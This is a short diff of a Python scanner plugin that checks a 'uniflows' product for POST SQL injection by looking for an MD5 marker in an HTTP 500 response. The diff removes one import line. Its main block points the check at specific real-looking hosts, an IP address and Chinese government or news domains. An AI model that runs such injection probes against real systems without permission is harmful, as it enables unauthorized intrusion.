@@ -15,7 +15,7 @@ def audit(arg):
     if code == 500 and "c4ca4238a0b923820dcc509a6f75849b" in res:
         security_hole("POST Injection: "+target)
 if __name__ == '__main__':
-    from dummy import *
+    
     audit(assign('uniflows', 'http://114.113.148.102/')[1])
     audit(assign('uniflows', 'http://szb.zgqy.zj.cn/')[1])
     #audit(assign('uniflows', 'http://epaper.xinjiangnet.com.cn/')[1])  #未通过
